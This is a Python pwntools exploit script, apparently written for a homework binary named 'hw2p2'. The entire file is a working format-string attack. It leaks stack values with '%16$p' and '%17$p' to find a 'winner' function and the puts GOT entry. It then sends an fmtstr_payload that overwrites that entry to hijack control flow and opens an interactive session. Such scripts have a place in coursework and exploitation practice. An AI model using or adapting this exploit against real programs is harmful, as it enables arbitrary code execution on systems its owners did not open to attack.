#!/usr/bin/env python3
#!/usr/bin/env python2
import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap



def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] +argv, gdbscript=gdbscript, aslr=True, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv, *a, **kw)
        
binPath="./hw2p2"
isRemote = pwn.args.REMOTE

# build in GDB support
gdbscript = '''
init-pwndbg
break *mainProcessing+85
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="DEBUG"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.update(arch='i386', os='linux')

io=start()

io.recvuntil("Get user input:\n")
io.sendline("%16$p")
winner=io.recvline()

io.recvuntil("Get user input:\n")
io.sendline("%17$p")
got=io.recvline()

print(winner)
winner1=winner.strip().decode("utf-8")
print("Converting winner function address to string")
print(type(winner1))
print(winner1)
winner2=int( winner1, 16)
print("Converting winner function address to integer")
print(type(winner2))
print(winner2)


print("got value")
print(got)
print("Converting got table address to string")
myStr=got.strip().decode("utf-8")
print(type(myStr))
print(myStr)
print("converting got value to integer")
gotint1=int( myStr, 16)
print(type(gotint1))
print(gotint1)
print("adding the offset require for the puts address")
putsaddr1=int(gotint1+int(28))
print(type(putsaddr1))
print(putsaddr1)


buffer=pwn.fmtstr_payload(1, {putsaddr1: winner2}, write_size='short')


pwn.info("buffer len: %d",len(buffer))
io.sendline(buffer)

io.interactive()
